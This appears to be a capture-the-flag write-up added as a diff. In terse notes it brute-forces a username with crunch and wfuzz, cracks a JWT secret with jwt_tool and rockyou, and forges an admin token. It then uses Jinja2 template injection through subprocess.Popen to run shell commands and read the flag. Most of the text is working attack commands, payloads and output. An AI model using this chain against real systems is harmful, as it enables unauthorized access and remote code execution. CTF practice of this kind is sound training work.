@@ -1,0 +1,46 @@
+'\bf\w\{4\}': '\bp\w\{7\}'
+
+f????: password
+
+# Create wordlist
+crunch 5 5 abcdefghijklmnopqrstuvwxyz -t f@@@@ > user.txt
+
+# Brute-force username
+wfuzz -c -w user.txt -d "nm=FUZZ&pass=password" --hc 403 -t 128 http://165.22.189.189/login
+	flask
+
+# Cookie
+token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZmxhc2siLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTYwNzUxMjUxMH0.NVTKECNb2nOVCsq7a0ygSFDWuch2MrZdvDFDFsCGC2Y
+	Payload
+	{
+	  "user": "flask",
+	  "admin": false,
+	  "exp": 1607512510
+	}
+
+# Brute-force secret key
+python3 jwt_tool.py -C eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZmxhc2siLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTYwNzUxMjUxMH0.NVTKECNb2nOVCsq7a0ygSFDWuch2MrZdvDFDFsCGC2Y -d /usr/share/wordlists/rockyou.txt
+	insecurepassword
+
+# Make payload "admin" to true and extend exp with secret key
+jwt.io
+	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZmxhc2siLCJhZG1pbiI6dHJ1ZSwiZXhwIjoxNjA3NTkzNzk1fQ.lMWuRVm4xgkQ4VrIiGofQwjnoD1LfYt5s4A6qnlBeXw
+
+http://165.22.189.189/admin?name=flask
+	Welcome! flask You have special powers.
+
+http://165.22.189.189/admin?name={{7*7}}
+	Welcome! 49 You have special powers.
+
+
+{{7*'7'}}
+	7777777
+
+Jinja2
+
+{{''.__class__.__mro__[1].__subclasses__()[405]}}
+	<class 'subprocess.Popen'>
+{{''.__class__.__mro__[1].__subclasses__()[405]('ls',shell=True,stdout=-1).communicate()}}
+	Dockerfile\n__pycache__\napp.py\nflag.txt\nmain.py\nrequirements.txt\nstatic\ntemplates\n
+{{''.__class__.__mro__[1].__subclasses__()[405]('cat flag.txt',shell=True,stdout=-1).communicate()}}
+	b00t2root{g3tting_thr0ugh_4_br0k3n_fl4sk}
